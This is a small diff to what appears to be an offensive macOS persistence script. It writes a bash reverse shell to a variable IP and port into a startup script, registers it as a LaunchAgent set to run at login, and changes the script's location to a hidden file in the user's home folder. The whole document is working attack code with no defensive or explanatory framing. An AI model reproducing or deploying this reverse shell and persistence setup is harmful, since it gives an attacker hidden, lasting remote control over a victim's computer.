@@ -1,4 +1,4 @@
-echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &' > /usr/local/bin/runonstartupMACOS.sh
+echo "bash -c 'exec bash -i &>/dev/tcp/$IP/$PORT <&1 &' > /Users/$(whoami)/.runonstartupMACOS.sh
 
 touch ~/Library/LaunchAgents/com.4lpndev.strt.plist
 
@@ -11,7 +11,7 @@ echo '
     <string>com.4lpndev.strt.plist</string>
     <key>ProgramArguments</key>
     <array>
-      <string>/usr/local/bin/runonstartupMACOS.sh</string>
+      <string>/Users/$(whoami)/.runonstartupMACOS.sh</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
